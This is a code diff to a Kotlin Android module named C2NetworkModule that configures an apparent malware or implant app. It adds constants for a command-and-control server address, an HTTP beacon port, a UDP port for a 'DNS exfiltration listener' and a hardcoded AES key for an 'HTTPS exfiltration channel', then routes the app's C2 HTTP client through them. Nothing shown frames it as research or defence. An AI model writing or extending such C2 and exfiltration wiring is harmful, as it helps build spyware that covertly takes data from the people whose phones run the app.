@@ -26,6 +26,24 @@ import javax.inject.Named
 @ContributesTo(AppScope::class)
 object C2NetworkModule {
 
+    /** IP of the C2 server. Change before building the APK. */
+    const val C2_SERVER_IP = "192.168.0.204"
+
+    /** HTTP port for the C2 server beacon endpoints. */
+    const val C2_HTTP_PORT = 8000
+
+    /**
+     * UDP port for the DNS exfiltration listener on the server.
+     * Must match DNS_LISTENER_PORT in server/config.py.
+     */
+    const val C2_DNS_PORT = 5300
+
+    /**
+     * AES-256 shared key (32 bytes) for the HTTPS exfiltration channel.
+     * Must match AES_SECRET_KEY in server/config.py.
+     */
+    const val AES_KEY = "c2k3y1234567890cabcdef1234567890"
+
     @Provides
     @SingleInstanceIn(AppScope::class)
     @Named("c2")
@@ -41,7 +59,7 @@ object C2NetworkModule {
     @Named("c2")
     fun c2Retrofit(@Named("c2") okHttpClient: OkHttpClient): Retrofit {
         return Retrofit.Builder()
-            .baseUrl("http://192.168.0.204:8000/")
+            .baseUrl("http://$C2_SERVER_IP:$C2_HTTP_PORT/")
             .client(okHttpClient)
             .addConverterFactory(MoshiConverterFactory.create())
             .build()
